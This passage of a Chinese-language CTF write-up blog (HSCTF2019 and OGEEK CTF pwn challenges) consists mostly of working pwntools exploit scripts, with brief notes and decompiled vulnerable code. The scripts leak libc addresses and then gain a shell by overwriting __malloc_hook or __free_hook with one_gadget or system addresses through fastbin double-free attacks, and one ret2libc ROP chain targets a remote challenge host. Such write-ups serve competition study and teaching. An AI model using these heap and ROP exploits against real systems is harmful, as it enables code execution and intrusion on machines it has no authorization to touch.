class="line">    Show(<span class="number">2</span>)</span><br><span class="line">    libc_base = u64(p.recvline().strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">88</span> - libc_offset</span><br><span class="line">    log.success(<span class="string">'libc base =&gt; '</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    main_arena = libc_base + libc_offset</span><br><span class="line">    fake_chunk = main_arena+<span class="number">0x8</span>+<span class="number">0x5</span></span><br><span class="line">    malloc_hook = libc_base + libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">    shell_addr = libc_base + gadgets[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">    Malloc(<span class="number">0x48</span>,<span class="string">'a'</span>)<span class="comment">#9</span></span><br><span class="line">    Malloc(<span class="number">0x48</span>,<span class="string">'a'</span>)<span class="comment">#10</span></span><br><span class="line">    Malloc(<span class="number">0x48</span>,<span class="string">'a'</span>)<span class="comment">#11</span></span><br><span class="line">    Free(<span class="number">4</span>)//put a chunk <span class="keyword">with</span> <span class="number">0x30</span> size into main_arena</span><br><span class="line">    Free(<span class="number">10</span>)</span><br><span class="line">    Free(<span class="number">11</span>)</span><br><span class="line">    Free(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Malloc(<span class="number">0x48</span>,p64(fake_chunk))<span class="comment">#12</span></span><br><span class="line">    Malloc(<span class="number">0x48</span>,<span class="string">'a'</span>)<span class="comment">#13</span></span><br><span class="line">    Malloc(<span class="number">0x48</span>,<span class="string">'c'</span>)<span class="comment">#14</span></span><br><span class="line">    payload = <span class="string">'\x00'</span>*<span class="number">3</span>+p64(main_arena+<span class="number">0x20</span>)+p64(<span class="number">0x51</span>)<span class="comment">#0x50 fastbins to malloc</span></span><br><span class="line">    Malloc(<span class="number">0x48</span>,payload)<span class="comment">#15</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#malloc to overwrite top chunk</span></span><br><span class="line">    fake_malloc_chunk = malloc_hook - <span class="number">0x15</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Malloc(<span class="number">0x48</span>,p64(<span class="number">0</span>)*<span class="number">5</span>+p64(fake_malloc_chunk))<span class="comment">#16</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    Malloc(<span class="number">0x48</span>,<span class="string">'\x00'</span>*<span class="number">5</span>+p64(shell_addr))<span class="comment">#18</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'17'</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>HSCTF2019</category>
      </categories>
  </entry>
  <entry>
    <title>OGEEK CTF</title>
    <url>/2020/09/03/OGEEK/</url>
    <content><![CDATA[<h1 id="OGEEK-CTF"><a href="#OGEEK-CTF" class="headerlink" title="OGEEK CTF"></a>OGEEK CTF</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前几天的OGEEK CTF，中间有事就没打了，hub是常规题但是由于自己理解不到位没做出来，0 day manager很像之前TSCTF打AWD的那种逻辑很复杂的题目，也是没找到漏洞最后看17学长wp才知道的。。读代码真的是又慢又没耐心又不仔细的我</p>
<h2 id="babyrop"><a href="#babyrop" class="headerlink" title="babyrop"></a>babyrop</h2><h3 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'i386'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./babyrop'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    p = process(<span class="string">'./babyrop'</span>)</span><br><span class="line">    gadgets = [<span class="number">0x3ac5c</span>,<span class="number">0x3ac5e</span>,<span class="number">0x3ac62</span>,<span class="number">0x3ac69</span>,<span class="number">0x5fbc5</span>,<span class="number">0x5fbc6</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    gadgets = [<span class="number">0x3a80c</span>,<span class="number">0x3a80e</span>,<span class="number">0x3a812</span>,<span class="number">0x3a819</span>,<span class="number">0x5f065</span>,<span class="number">0x5f066</span>]</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line">    p = remote(<span class="string">'47.112.137.228'</span>,<span class="number">13337</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    p.send(<span class="string">'\x00'</span>*<span class="number">7</span>+p32(<span class="number">0xff</span>)+<span class="string">'\n'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Correct\n'</span>)</span><br><span class="line">    write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">    write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">    main_addr = <span class="number">0x080487d0</span></span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0xe7</span>+<span class="string">'a'</span>*<span class="number">4</span></span><br><span class="line">    payload += p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    libc_base = u32(p.recvn(<span class="number">4</span>)) - libc.symbols[<span class="string">'write'</span>]</span><br><span class="line">    log.success(<span class="string">'libc base =&gt; '</span> + hex(libc_base))</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    binsh_addr = libc_base + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0xe7</span>+<span class="string">'a'</span>*<span class="number">4</span></span><br><span class="line">    payload += p32(system_addr) + <span class="string">'a'</span>*<span class="number">4</span>+p32(binsh_addr)</span><br><span class="line">    <span class="comment">#gdb.attach(p,'b* 0x08048824')</span></span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h2 id="book-manager"><a href="#book-manager" class="headerlink" title="book manager"></a>book manager</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./bookmanager'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./bookmanager'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AddChapter</span><span class="params">(chapter_name)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Chapter name:"</span>)</span><br><span class="line">    p.send(chapter_name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AddSection</span><span class="params">(chapter_name,section_name)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Which chapter do you want to add into:"</span>)</span><br><span class="line">    p.sendline(chapter_name)</span><br><span class="line">    recv_data = p.recvline().strip(<span class="string">'\n'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Section name:'</span>)</span><br><span class="line">    p.send(section_name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AddText</span><span class="params">(section_name,size,text)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Which section do you want to add into:"</span>)</span><br><span class="line">    p.sendline(section_name)</span><br><span class="line">    p.recvuntil(<span class="string">'How many chapters you want to write:'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'Text:'</span>)</span><br><span class="line">    p.send(text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RemoveChapter</span><span class="params">(chapter_name)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Chapter name:'</span>)</span><br><span class="line">    p.sendline(chapter_name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RemoveSection</span><span class="params">(section_name)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'5'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Section name:'</span>)</span><br><span class="line">    p.sendline(section_name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RemoveText</span><span class="params">(section_name)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'6'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Section name:'</span>)</span><br><span class="line">    p.sendline(section_name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Preview</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'7'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Update</span><span class="params">(update_type,name_1,new_content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'8'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'What to update?(Chapter/Section/Text):'</span>)</span><br><span class="line">    p.sendline(update_type)</span><br><span class="line">    p.recvuntil(<span class="string">'name:'</span>)</span><br><span class="line">    p.send(name_1)</span><br><span class="line">    p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    p.send(new_content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Name of the book you want to create: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'xmzyshypnc'</span>)</span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    AddChapter(<span class="string">'0'</span>*<span class="number">8</span>)</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    AddChapter('1'*8)</span></span><br><span class="line"><span class="string">    AddChapter('2'*8)</span></span><br><span class="line"><span class="string">    AddChapter('3'*8)</span></span><br><span class="line"><span class="string">    AddChapter('4'*8)</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    AddSection(<span class="string">'0'</span>*<span class="number">8</span>,<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line">    AddSection(<span class="string">'0'</span>*<span class="number">8</span>,<span class="string">'b'</span>*<span class="number">8</span>)</span><br><span class="line">    AddSection(<span class="string">'0'</span>*<span class="number">8</span>,<span class="string">'c'</span>*<span class="number">8</span>)</span><br><span class="line">    AddSection(<span class="string">'0'</span>*<span class="number">8</span>,<span class="string">'d'</span>*<span class="number">8</span>)</span><br><span class="line">    AddSection(<span class="string">'0'</span>*<span class="number">8</span>,<span class="string">'e'</span>*<span class="number">8</span>)</span><br><span class="line">    AddSection(<span class="string">'0'</span>*<span class="number">8</span>,<span class="string">'f'</span>*<span class="number">8</span>)</span><br><span class="line">    AddSection(<span class="string">'0'</span>*<span class="number">8</span>,<span class="string">'g'</span>*<span class="number">8</span>)</span><br><span class="line">    AddText(<span class="string">'a'</span>*<span class="number">8</span>,<span class="number">0x80</span>,<span class="string">'A'</span>*<span class="number">8</span>)</span><br><span class="line">    AddText(<span class="string">'b'</span>*<span class="number">8</span>,<span class="number">0x68</span>,<span class="string">'B'</span>*<span class="number">8</span>)<span class="comment">#</span></span><br><span class="line">    AddText(<span class="string">'c'</span>*<span class="number">8</span>,<span class="number">0xf8</span>,<span class="string">'C'</span>*<span class="number">8</span>)</span><br><span class="line">    AddText(<span class="string">'d'</span>*<span class="number">8</span>,<span class="number">0xf8</span>,<span class="string">'D'</span>*<span class="number">8</span>)</span><br><span class="line">    RemoveText(<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line">    Update(<span class="string">'Text'</span>,<span class="string">'b'</span>*<span class="number">8</span>,<span class="string">'a'</span>*<span class="number">0x60</span>+p64(<span class="number">0x100</span>)+p64(<span class="number">0x100</span>))</span><br><span class="line">    RemoveText(<span class="string">'c'</span>*<span class="number">8</span>)</span><br><span class="line">    AddText(<span class="string">'a'</span>*<span class="number">8</span>,<span class="number">0x80</span>,<span class="string">'A'</span>*<span class="number">8</span>)</span><br><span class="line">    Preview()</span><br><span class="line">    p.recvuntil(<span class="string">'Section:bbbbbbbb'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Text:'</span>)</span><br><span class="line">    libc_base = u64(p.recvline().strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - libc_offset - <span class="number">88</span></span><br><span class="line">    log.success(<span class="string">'libc base =&gt; '</span> + hex(libc_base))</span><br><span class="line">    fake_chunk = libc_base + libc.symbols[<span class="string">'__malloc_hook'</span>] - <span class="number">0x23</span></span><br><span class="line">    log.success(<span class="string">'fake chunk addr =&gt; '</span> + hex(fake_chunk))</span><br><span class="line">    shell_addr = libc_base + gadgets[<span class="number">1</span>]</span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    AddText(<span class="string">'e'</span>*<span class="number">8</span>,<span class="number">0x68</span>,<span class="string">'E'</span>*<span class="number">8</span>)<span class="comment"># B &amp; E</span></span><br><span class="line">    RemoveText(<span class="string">'e'</span>*<span class="number">8</span>)</span><br><span class="line">    Update(<span class="string">'Text'</span>,<span class="string">'b'</span>*<span class="number">8</span>,p64(fake_chunk))</span><br><span class="line">    AddText(<span class="string">'e'</span>*<span class="number">8</span>,<span class="number">0x68</span>,<span class="string">'E'</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    AddText(<span class="string">'f'</span>*<span class="number">8</span>,<span class="number">0x68</span>,<span class="string">'a'</span>*<span class="number">0x13</span>+p64(shell_addr))</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Which section do you want to add into:"</span>)</span><br><span class="line">    p.sendline(<span class="string">'g'</span>*<span class="number">8</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'How many chapters you want to write:'</span>)</span><br><span class="line">    p.sendline(str(<span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h2 id="hub"><a href="#hub" class="headerlink" title="hub"></a>hub</h2><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>输入的index可以是负数，存在double free，这里一次只能覆写8个字节，卡在次数不够多次覆写stdout，看e3pem大佬的exp才知道一是没有PIE的情况下可以通过bss上的stdout和stderr劫持方式去分配到stdout，二是只修改stdout的flag字段及write_base即可泄露libc，下面的exp为大佬的exp。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main_func</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> choice; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> *ptr; <span class="comment">// ST28_8</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> size; <span class="comment">// [rsp+14h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *chunk_addr; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> *v7; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">0x27</span>;</span><br><span class="line">  chunk_addr = <span class="number">0L</span>L;</span><br><span class="line">  v7 = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = v4--;</span><br><span class="line">    <span class="keyword">if</span> ( !(_DWORD)result )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    menu();</span><br><span class="line">    choice = read_int();</span><br><span class="line">    <span class="keyword">if</span> ( choice == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Which hub don't you want?"</span>);</span><br><span class="line">      ptr = &amp;v7[(<span class="keyword">signed</span> <span class="keyword">int</span>)read_int()];        <span class="comment">// 负数</span></span><br><span class="line">      <span class="built_in">free</span>(ptr);                                <span class="comment">// double free</span></span><br><span class="line">      <span class="keyword">if</span> ( chunk_addr == ptr )</span><br><span class="line">        chunk_addr = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( choice &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( choice == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"What do you want?"</span>);</span><br><span class="line">        read(<span class="number">0</span>, chunk_addr, <span class="number">8u</span>LL);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( choice == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Bye"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( choice == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"How long will you stay?"</span>);</span><br><span class="line">      size = read_int();</span><br><span class="line">      <span class="keyword">if</span> ( size &gt; <span class="number">0x400</span> )</span><br><span class="line">        chunk_addr = <span class="number">0L</span>L;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        chunk_addr = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(size);</span><br><span class="line">      <span class="keyword">if</span> ( !chunk_addr )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Malloc faild"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      v7 = chunk_addr;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="e3pem-py"><a href="#e3pem-py" class="headerlink" title="e3pem.py"></a>e3pem.py</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./hub'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./hub'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Malloc</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"How long will you stay?"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Free</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Which hub don't you want?"</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Write</span><span class="params">(content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"want?"</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    Malloc(<span class="number">0x50</span>)</span><br><span class="line">    Malloc(<span class="number">0x40</span>)</span><br><span class="line">    Malloc(<span class="number">0x60</span>)</span><br><span class="line">    Malloc(<span class="number">0x30</span>)</span><br><span class="line">    Malloc(<span class="number">0x30</span>)</span><br><span class="line">    Free(<span class="number">-0x40</span>)</span><br><span class="line">    Free(<span class="number">-0x40</span>)</span><br><span class="line">    Free(-(<span class="number">0x40</span>+<span class="number">0x70</span>))</span><br><span class="line">    Free(-(<span class="number">0x40</span>+<span class="number">0x70</span>))</span><br><span class="line">    Free(-(<span class="number">0x40</span>+<span class="number">0x70</span>+<span class="number">0x50</span>))</span><br><span class="line">    Free(-(<span class="number">0x40</span>+<span class="number">0x70</span>+<span class="number">0x50</span>))</span><br><span class="line">    Free(-(<span class="number">0x40</span>+<span class="number">0x70</span>+<span class="number">0x50</span>+<span class="number">0x60</span>))</span><br><span class="line">    Free(-(<span class="number">0x40</span>+<span class="number">0x70</span>+<span class="number">0x50</span>+<span class="number">0x60</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#write stdout flag</span></span><br><span class="line">    Malloc(<span class="number">0x30</span>)</span><br><span class="line">    Write(p64(<span class="number">0x602020</span>))</span><br><span class="line">    Malloc(<span class="number">0x30</span>)</span><br><span class="line">    Malloc(<span class="number">0x30</span>)</span><br><span class="line">    Malloc(<span class="number">0x30</span>)</span><br><span class="line">    Write(p64(<span class="number">0xfbad1800</span>))</span><br><span class="line"></span><br><span class="line">    Malloc(<span class="number">0x40</span>)</span><br><span class="line">    Write(p64(<span class="number">0x602040</span>))</span><br><span class="line">    Malloc(<span class="number">0x40</span>)</span><br><span class="line">    Malloc(<span class="number">0x40</span>)</span><br><span class="line">    Write(<span class="string">'\x79\x07\xdd'</span>)</span><br><span class="line"></span><br><span class="line">    Malloc(<span class="number">0x50</span>)</span><br><span class="line">    Write(p64(<span class="number">0x602040</span>))</span><br><span class="line">    Malloc(<span class="number">0x50</span>)</span><br><span class="line">    Malloc(<span class="number">0x50</span>)</span><br><span class="line">    Malloc(<span class="number">0x50</span>)</span><br><span class="line">    Write(p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    p.recvn(<span class="number">8</span>)</span><br><span class="line">    libc_addr = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    log.success(<span class="string">'libc addr =&gt; '</span> + hex(libc_addr))</span><br><span class="line">    libc_base = libc_addr - (<span class="number">0x7ffff7dd18b0</span><span class="number">-0x7ffff79e4000</span>)</span><br><span class="line">    log.success(<span class="string">'libc addr =&gt; '</span> + hex(libc_base))</span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    Malloc(<span class="number">0x60</span>)</span><br><span class="line">    Write(p64(libc_base+libc.symbols[<span class="string">'__free_hook'</span>]))</span><br><span class="line">    Malloc(<span class="number">0x60</span>)</span><br><span class="line">    Malloc(<span class="number">0x60</span>)</span><br><span class="line">    Write(p64(libc_base+libc.symbols[<span class="string">'system'</span>]))</span><br><span class="line">    Malloc(<span class="number">0x70</span>)</span><br><span class="line">    Write(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">    gdb.attach(p,<span class="string">'b* 0x400a53'</span>)</span><br><span class="line">    Free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h2 id="0day-manager"><a href="#0day-manager" class="headerlink" title="0day manager"></a>0day manager</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>题目可以分配不同类型的chunk，这里的Handle在for循环的free之后有一个while循环，当num不为0的时候会执行<code>v14 = (_QWORD *)*v14;</code>得到0之后会清空上次释放的堆地址，否则还是将原地址赋给相应位置，从而下次Handlle Double Free，注意calloc用的是_int_malloc而不是_libc_malloc，因此不会用Tcache的机制分配，最后利用的是fastbin。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">_QWORD *<span class="title">Handle</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> **ptr; <span class="comment">// ST50_8</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">void</span> *v2; <span class="comment">// ST58_8</span></span><br><span class="line">  _QWORD *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">void</span> **v4; <span class="comment">// ST40_8</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">void</span> *v6; <span class="comment">// ST48_8</span></span><br><span class="line">  <span class="keyword">void</span> **v7; <span class="comment">// ST30_8</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">void</span> *v9; <span class="comment">// ST38_8</span></span><br><span class="line">  <span class="keyword">int</span> num; <span class="comment">// [rsp+Ch] [rbp-54h]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [rsp+10h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">int</span> choice; <span class="comment">// [rsp+14h] [rbp-4Ch]</span></span><br><span class="line">  _QWORD *k; <span class="comment">// [rsp+18h] [rbp-48h]</span></span><br><span class="line">  _QWORD *v14; <span class="comment">// [rsp+18h] [rbp-48h]</span></span><br><span class="line">  _QWORD *i; <span class="comment">// [rsp+20h] [rbp-40h]</span></span><br><span class="line">  _QWORD *v16; <span class="comment">// [rsp+20h] [rbp-40h]</span></span><br><span class="line">  _QWORD *j; <span class="comment">// [rsp+28h] [rbp-38h]</span></span><br><span class="line">  _QWORD *v18; <span class="comment">// [rsp+28h] [rbp-38h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Which type 0day you want to delete?"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"1. Leak"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"2. Memory corruption"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"3. Logic"</span>);</span><br><span class="line">  choice = read_int();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"How many you want to handle in?"</span>);</span><br><span class="line">  num = read_int();</span><br><span class="line">  v11 = num;</span><br><span class="line">  <span class="keyword">if</span> ( choice == <span class="number">2</span> )</span><br><span class="line">  